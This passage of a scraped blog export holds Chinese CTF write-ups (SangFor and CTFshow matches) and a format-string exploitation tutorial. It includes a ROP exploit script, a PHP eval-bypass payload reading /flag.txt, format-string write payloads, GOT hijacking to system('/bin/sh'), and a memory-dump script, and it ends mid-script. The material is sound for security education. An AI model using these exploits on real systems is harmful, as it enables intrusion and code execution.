encodeFlag=3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P 跑更换码表base64解码算法还原flag：SangFor{212f4548-03d1-11ec-ab68-00155db3a27e} ​ PWNBabyRop有system函数和/cin/sh，简单ROP，缺少的/bin/sh\\x00可以用sh\\x00代替。 12345678910111213141516171819#coding:utf-8from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;192.168.42.14&#x27;, 11000)elf = ELF(&#x27;./BabyRop&#x27;)sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)sh_addr = 0x0804c029system_addr = 0x80490a0pay = &#x27;A&#x27; * (0x28 + 4) + p32(system_addr) + p32(0) + p32(sh_addr)pause()sl(pay)p.interactive() ​ CryptoRingRingRing ring a ring a ring ring a ring a ring nc测试md5-PoW之后，需要输入100组a,b,c,d,e，使得 $a^4+b^4+c^4+d^4=e^2$，且都不能为0。 构造 $1^4+1^4+1^4+1^4=2^2$，再按倍数做乘积 $k^4+k^4+k^4+k^4=(2k^2)^2,k \\in [1,100]$，得到100组用例。 123456789101112131415161718192021222324from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import md5def brute_force(prefix,s): return bruteforce(lambda x:md5(x+prefix).hexdigest()[0:5]==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r=remote(&#x27;192.168.42.14&#x27;,2378)prefix, s = parse(&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;,r.recvline())r.sendlineafter(&#x27;[&gt;] Give me xxxxx: &#x27;,brute_force(prefix,s))r.recvline()r.recvline()for i in range(1,101): r.sendlineafter(&#x27;[&gt;] a: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] b: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] c: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] d: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] e: &#x27;,str(2*i*i)) print(r.recvline())print(r.recvline())#GWHT&#123;a_funny_equation&#125; ​ Easy_Rsa 你了解RSA吗??? 12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from flag import flagimport gmpy2def gen_prime(nbits, gamma): g = getPrime(int(nbits * gamma)) alpha = 0.5 - gamma while True: a = getRandomNBitInteger(int(alpha * nbits)) p = 2 * g * a + 1 if isPrime(p): b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 h = 2 * g * a * b + a + b while not isPrime(q) or isPrime(h) or gmpy2.gcd(a, b) != 1: b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 return p, qdef encrypt(nbits, gamma): p, q = gen_prime(nbits, gamma) n = p * q e = getPrime(16) while gmpy2.gcd(e, gmpy2.lcm(p-1,q-1)) != 1: e = getPrime(16) m = bytes_to_long(flag) c = pow(m, e, n) return n, e, cn, e, c = encrypt(1024, 0.48)print &#x27;n =&#x27;, nprint &#x27;e =&#x27;, eprint &#x27;c =&#x27;, c# n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039# e = 58337# c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668 共素数攻击（common prime RSA）。 给出 $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$，有 $N-1=2gh$， 所以 $x^{N-1} \\pmod p$ 至多有 $a$ 个值，用 $x \\rightarrow x^{N-1}+3$ 代替 Pollard’s rho算法中迭代函数，能在 $\\text{O}(\\sqrt{a})=\\text{O}(N^{\\frac{1}{4}-\\frac{\\gamma}{2}})$ 下分解 $N$。 common prime RSA在 $g$ 过小时， $g$ 也能轻易通过分解 $N-1$ 来解出。 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 while True: a = getRandomRange(2, n) b = f(a, n) j = 1 while True: p = GCD(abs(a - b), n) print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i)) if p == n: break elif p &gt; 1: return (p, n // p) else: a = f(a, n) b = f(f(b, n), n) j += 1 i += 1n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039e = 58337c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668p, q = rho(n)d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27; ​ Bigrsa BigRSA！ 123456789101112131415from Crypto.Util.number import *from flag import *n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537m = bytes_to_long(flag)c = pow(m, e, n1)c = pow(c, e, n2)print(&quot;c = %d&quot; % c)# output# c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264 尝试发现 $\\gcd(n_1,n_2)=p$，分别求出 $q_1=n_1/p,q_2=n_2/p$，再用常规解密方法两步求出 $m$： 123456789101112131415import gmpy2n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264p = gmpy2.gcd(n1,n2)q1 = n1 // pq2 = n2 // pd1 = gmpy2.invert(e, (p-1)*(q1-1))d2 = gmpy2.invert(e, (p-1)*(q2-1))c = pow(c, d2, n2)m = pow(c, d1, n1)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27; ​ Misc签到题 简简单单猜数字01-30 SangFor{md5(---…..)}（32位md5） 12张图分别得到关键数字：28-08-30-07-04-20-02-17-23-01-12-19，md5得flag：SangFor{d93b7da38d89c19f481e710ef1b3558b} ​ Misc520 有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。 拿到520.zip压缩包，循环嵌套着520层zip和story文件，脚本解压出所有文件（每次解压将story文件重命名防覆盖）： 12345678910111213141516171819202122import zipfile import osnow = &quot;520.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) zfile.extractall(members=zfile.namelist()) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() os.rename(&#x27;story&#x27;,&#x27;story&#x27;+now.split(&#x27;.&#x27;)[0]) print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break print(&#x27;~~~~&#x27;+now) 解出最里层是一张flag.png图片，按大小排序目录下所有文件，发现story150内容与其他不同： 123456这都被你发现了？我这故事不错吧，嘻嘻嘻那就把flag给你吧oh，不，还有一半藏在了pcap的心里，快去找找吧左心房右心房，扑通扑通的心，咿呀咿呀的❤72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, 得到数字 72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, 根据提示，zsteg查看png图片存在lsb隐写，按bgr方式提取出一个zip加密压缩包，爆破得密码12345解出flag.pcap。 wireshark查看发现全为USB流量，tshark提取： tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt 将鼠标数据还原鼠标移动轨迹： 12345678910111213141516171819202122232425262728293031323334353637383940f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close()nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() 最后gnuplot做图： gnuplot&gt; plot &quot;xy.txt&quot; 得到后半部分数字：130, 63, 111, 94, 51, 134, 119, 146 结合flag格式，推知为变异凯撒移位解密，解出： [71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125] 即GWHT&#123;W3lCom3_t0_M!sc&#125;，按群提示换为Sangfor&#123;W3lCom3_t0_M!sc&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow 吃瓜杯","slug":"match-CTFshow-吃瓜杯","date":"2021-08-16T11:22:00.000Z","updated":"2021-08-16T12:32:10.014Z","comments":true,"path":"2021/08/16/match-CTFshow-吃瓜杯/","permalink":"https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"","text":"​ 比赛名称：ctfshow 吃瓜杯题目范围：web pwn re misc crypto题目难度：怎么简单怎么来比赛奖励：ctfshow定制鼠标垫或萌妹手办比赛时间：2021年8月14日(周六) 晚 7点7分比赛时长：48小时比赛地址：https://ctf.show/challenges MISCMisc游戏签到 运气与策略运气的游戏。值得注意的是，第一局出现必输的情况是正常的，并且概率较低，这能表明您在七夕这个节日真的非常欧，这边建议去抽卡。所以说本题没有策略，只有运气。 地址： 移步去备用题,flag就在这交 运气游戏，写个循环脚本跑出分段flag。 ​ Dinner of Cyanogen给了两个docx，一个未加密，另一个加密。 在未加密docx得到flag第一段； 发现其中的 [Content_Types].xml 大小相同，上明文攻击： rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot; 得到3-key，再用7z工具解压： 7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout 在 flag.xml 得到flag第二段； 在 word.xml 分别用0/1代替Wingdings两种字体，转字符串得到flag第三段。 ​ xl的本质Excel 2007（.xlsx）文件本质是压缩包。 新建一个excel，插入绘图，保存退出。 替换其中 xl/drawing 目录下的 drawing.xml 为题目给的xml文件，再打开xlsx文件看到flag图片。 ​ 吃瓜jpg改为zip解压，文件为base64图片，浏览器打开得到二维码，扫码得栅栏密码，枚举栏数（栏数=2）解密得flag。 ​ 魔王 需要自己包上ctfshow{} 题目有很多误导，小心点哦 w3x为魔兽争霸地图文件，直接找到地图查看工具 War3 Model Editor，找到flag字符串。 ​ CRYPTO闪电五连鞭·一鞭 朋友们好。 今天，和大家，探讨一下，怎样打RSA置换闪电鞭。 要做到三点。 一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释； 二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊…… 三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊…… 下面我打一个连五鞭啊……打了五鞭：一鞭，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出flag，打出RSA置换闪电鞭！ 谢谢朋友们。 1234567import gmpy2n = 8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719c = 6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231d = gmpy2.invert(3, euler_phi(n))m = pow(c, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·二鞭12345678910111213141516171819202122import randomimport gmpy2random.seed(0x36D)n = 3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647Zn = Zmod(n)P = PermutationGroupElement(&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;)P = Matrix(Zn, P.matrix())A = Matrix(Zn, 36, 36, lambda x, y: random.randint(0, 0x36D))B = A * P * A^-1c = [...]C = []for i in range(36): C.append(c[i*36:(i+1)*36])C = Matrix(Zn, C)B_inv = B^3C_new = C / B_invcc = C_new[0][0]d = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·三鞭123456789101112# BB = B^3# BB_inv = BB^(-1)# CC = C * BB_invimport gmpy2n = 25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203cc = 2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730cc = (cc * gmpy2.invert(36, n)) % nd = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·四鞭12345678910111213# BB = B^17# BB_inv = BB^(-1)# CC = C * BB_inv# I.trace() = 88import gmpy2n = 8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993cc = 5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810cc = (cc * gmpy2.invert(88, n)) % nd = gmpy2.invert(17, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 大鸟转转转 为响应群主“怎么简单怎么来”的号召，特补上一道古典密码。 明文密文都是大写字母。 请解出正确的明文后，把明文转换成小写，并加上格式所包含的花括号。 Engima密码机。 python反序列化： 12345import picklex = pickle.load(open(&#x27;nimage.pickle&#x27;, &#x27;rb&#x27;))print(x)#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125; 尝试用全脚本解密得到的结果有问题，再用pycipher工具解密： 12345678910111213from pycipher import Enigmaimport stringdic = string.ascii_uppercasefor x in dic: for y in dic: for z in dic: eng = Enigma(settings=(&#x27;W&#x27;,&#x27;Y&#x27;,&#x27;F&#x27;),rotors=(1,2,3),reflector=&#x27;B&#x27;, ringstellung=(x,y,z),steckers=[(&#x27;W&#x27;,&#x27;O&#x27;),(&#x27;D&#x27;,&#x27;E&#x27;), (&#x27;J&#x27;,&#x27;B&#x27;),(&#x27;H&#x27;,&#x27;N&#x27;),(&#x27;X&#x27;,&#x27;I&#x27;)]) flag = eng.decipher(&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;) if flag.startswith(&#x27;CTFSHOW&#x27;): print((x,y,z),flag.lower()) ​ REVERSETea_tube_pot 三点几嚟，饮茶先啦！（给大佬递茶.jpg） flag分三部分。 第一部分 TEA加密： 1234567891011121314151617181920212223242526def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x5FD744F6,0x95832046] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1])# ENCrT1ny 第二部分 XTEA加密： 1234567891011121314151617181920212223def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0xFD731313, 0x6662CB90] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # yPti0nA1 第三部分 XXTEA加密： 123456789101112131415161718192021222324252627def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x4B136C82, 0x1A6E9613] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # 9ori7hM! ​ PWNwuqianROP x64签到。然后签退。 ​ WEB热身 最简单的签到 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 八进制绕过，前面加个字符：?num=%0a010574。 ​ shellme 还是熟悉的感觉 phpinfo页面直接搜flag，很熟悉。 ​ shellme_Revenge 由于上个题有严重的非预期，我的锅，在此给师傅们道歉了 cookie 看到 hint=looklook，访问 ?looklook=1 得到源码： 123456789101112131415161718192021&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; 禁用了很多 RCE 绕过姿势，未禁用 $+_;?()[]&lt;&gt;、字母C 和数字0-3，尝试用截断输出内容，用PHP自增特性生成其他字母： 12345$_=[];?&gt;&lt;?=$_ //真Array$_=([].C);?&gt;&lt;?=$_ //字符串ArrayC$_=([].C)[3];?&gt;&lt;?=$_ //字母a$_=([].C)[3];$_++;?&gt;&lt;?=$_ //字母b...... 根据PHP拼接特性，将需要的关键字拆分成字母，用自增特性生成，按照字母序生成可节省payload长度。 payload生成脚本： 1234567891011121314151617181920212223242526272829303132# payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) POST： 12ctf_show = $_=([].C)[3];$α=$_;$_++;$_++;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$σ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$χ=$_;$β=$ε.$χ.$α.$σ;$_=C;$_++;$_++;$γ=$_;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$μ=$_;($&#123;_.$ε.$γ.$μ&#125;[0])($&#123;_.$ε.$γ.$μ&#125;[1]); GET: ?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"格式化字符串","slug":"pwn-格式化字符串","date":"2021-08-08T10:23:45.000Z","updated":"2024-11-18T13:36:46.081Z","comments":true,"path":"2021/08/08/pwn-格式化字符串/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"​ 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 根本原因是调用 printf 函数族的时候，因为格式字符串要求的参数个数和实际的参数格式不匹配导致去堆栈中取数据，导致泄漏出堆栈数据。 ​ 格式化字符串基本格式：%[parameter][flags][field width][.precision][length]type 参数（parameter） n$：获取格式化字符串中的指定参数 长度（length） hh：输出一个字节，8位无符号整数，容量范围为0到255。 h：输出一个双字节，16位无符号整数，容量范围为0到65535。 类型（type） d/i：有符号整数 u：无符号整数 c：单个字符 x/X：无符号16进制整数（小写/大写） o：无符号8进制整数 s：字符串 p：转换为可打印字符的指针值 n：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。它的容量取决于可控制的输出大小，通常在4字节范围内。 ​ 利用方法泄露内存%nx / %np：按顺序泄露栈数据 %s：获取变量地址内容，遇零截断 %n$x / %n$p / %n$s：获取指定第n个参数的值或字符串 addr%X$p：泄露任意地址的数据（addr为要泄露的地址） ​ 覆盖内存%Yc%X$n：将Y写入栈上第X个位置指针指向的位置（Y为要写入的数据，X为任意正整数） addr%(Y-4)c%X$n：向任意地址写（addr为要写入的地址） 栈地址覆盖例：把c的值从789改写为16。 c_addr 占4个字节，所以额外加上12个字节，最终向 c_addr 指向的空间赋值16： payload = p32(c_addr) + b&#39;%12c&#39; + b&#39;%6$n&#39; 小数覆盖例：把a的值改写为2。 如果还用之前的方式，写入的地址最少要占4位，因此最小只能赋值4，尝试把地址放到后面的位置。 赋值2，要写作aa%X$n, 把2赋值给第X个位置指针指向的位置。这个字符串长度为6，不是4的倍数，所以还要补全两个字符，再加上a的地址。这样最终a是落在了栈上第8个位置： payload = b&#39;aa%8$nbb&#39; + p32(a_addr) 大数覆盖例：把b的值改写为0x12345678。 需要赋值一个很大的数，这时候直接向栈中写入这么多的数据肯定不太方便。利用 hh（单字节） 和 h（双字节） 参数逐字节写入。 以单字节的方式写入，若b的地址是 0x0804c028，逐字节写入后的数据分配应该如下所示： 12340x0804c028 \\x780x0804c029 \\x560x0804c02a \\x340x0804c02b \\x12 因此随着构造payload，字符串长度是逐渐增长的，因此要按照从小到大的顺序填充字节，这里要从高位向地位填充： payload = p32(0x0804c02b) + b&#39;a&#39;*(0x12 - 4) + b&#39;%6$hhn&#39; （当前总长度=24，字符长度0x12） 下面填充次高位。填充后面的时候要注意，因为这是一次发送的payload，因此填充后面的时候，前面的字符串长度也要算上，前面的字符串长度已经有24个字节，因此次高位的地址会写入第25-28个字节，这样对应的就是栈中的第12个位置（24/4 + 6）。 构造次高位的字符串时要注意不能包括 %6$hhn 的长度，因此接下来还要填充的字符串个数是 次高字节需要的总字节数 - 填充上一字节已经构造的字节数 - 次高字节地址位数。次高地址这里后续还有payload要填充，由于要地址对齐，因此添加三个b，使得总长度为4的倍数： payload += p32(0x0804c02a) + b&#39;a&#39;*(0x34 - 0x12 - 4) + b&#39;%12$hhn&#39; + b&#39;bbb&#39; （当前总长度=68） 接下来填充次低位。构造方法和上面类似，不过添加字符的时候要记得把 bbb 这三个对齐字节的长度减去： payload += p32(0x0804c029) + b&#39;a&#39;*(0x56 - 0x34 - 4 - 3) + b&#39;%23$hhn&#39; + b&#39;bb&#39; （当前总长度=108） 最后填充低位： payload += p32(0x0804c028) + b&#39;a&#39;*(0x78- 0x56 - 4 - 2) + b&#39;%33$hhn&#39; pwntools工具12345678fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)offset (int): 字符串的偏移，从1开始writes (dict): 注入的地址和值，&#123;target_addr:change_to&#125;numbwritten (int) : 已经由printf函数写入的字节数，默认为0write_size : 逐byte/short/int写入，默认是byte64位：加context(arch=&#x27;amd64&#x27;) 参考64位格式化字符串详解 ​ 其他GOT hijack没有开启FULL RELRO时，可以修改如puts_got变为system的地址（利用fmtstr_payload），在调用 puts(&quot;/bin/sh&quot;) 时会变成 system(&quot;/bin/sh&quot;) 从而getshell。 ​ fini_array劫持（待补充） ​ blind pwn dump利⽤格式化字符串dump出elf。 dump脚本： 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.os = &#x27;linux&#x27;context.log_level = &quot;debug&quot;context.arch = &#x27;amd64&#x27;# context.arch = &#x27;i386&#x27;#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;127.0.0.1&#x27;,5001)begin=0x400000bin = b&#x27;&#x27;def leak(addr): pl=&quot;%7$sdump&quot;+p64(addr) p.sendlineafter(&#x27;Please enter your answer\\n&#x27;, pl) data=p.recvuntil(&#x27;dump&#x27;,drop=True) #data = p.recvrepeat(0.2) return datatry: while True: data = leak(begin) begin = begin+len(data) bin += data if len(data)==0: begin+=1 bin += &#x27;\\x00&#x27;except: print(&quot;finish&quot;)finally: print &#x27;[+]&#x27;,len(bin) with open(&#x27;dump_bin&#x27;,&#x27;wb&#x27;) as f: 